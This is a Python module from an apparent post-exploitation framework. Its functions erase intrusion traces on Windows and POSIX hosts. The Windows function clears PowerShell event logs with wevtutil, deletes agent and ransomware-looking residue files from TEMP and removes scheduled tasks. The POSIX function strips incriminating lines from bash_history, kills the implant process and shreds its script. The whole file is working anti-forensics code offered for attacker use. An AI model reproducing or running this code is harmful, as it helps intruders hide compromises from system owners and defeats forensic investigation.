"""quantum.postexploit.footprint — selective trace wiping (Windows + POSIX)."""
from __future__ import annotations

from quantum.core.logging import log
from quantum.core.opsec import run


def footprint_wipe_windows():
    """FOOTPRINT: selective log trimming + agent residue removal (Windows).
    We do NOT wholesale clear logs (louder than the noise we're hiding)."""
    cmds = [
        "wevtutil cl 'Windows PowerShell'",
        "wevtutil cl 'Microsoft-Windows-PowerShell/Operational'",
        "Remove-Item $env:TEMP\\lakitu*, $env:TEMP\\a.bat, $env:TEMP\\*.locky* -ErrorAction SilentlyContinue",
        "Remove-Item $env:TEMP\\kl.klq, \"$env:TEMP\\obsidian*.ps1\" -ErrorAction SilentlyContinue",
        "schtasks /delete /tn qcli* /f"
    ]
    out = []
    for c in cmds:
        r = run(f"powershell -NoProfile -Command {c}")
        out.append({"cmd": c, "rc": r.returncode})
    log(f"FOOTPRINT: {sum(1 for x in out if x['rc']==0)}/{len(out)} wipe steps succeeded", "OPSEC")
    return out


def footprint_wipe_posix():
    """FOOTPRINT: POSIX residue removal — log greps + agent file cleanup."""
    cmds = [
        "sed -i '/qcLi/d;/ghostfang/d' ~/.bash_history 2>/dev/null",
        "rm -f /var/tmp/.gn-* 2>/dev/null",
        "pkill -f ghostfang.sh 2>/dev/null",
        "shred -u ~/ghostfang.sh 2>/dev/null",
    ]
    out = []
    for c in cmds:
        r = run(c)
        out.append({"cmd": c, "rc": r.returncode})
    log(f"FOOTPRINT-POSIX: {sum(1 for x in out if x['rc']==0)}/{len(out)} steps", "OPSEC")
    return out
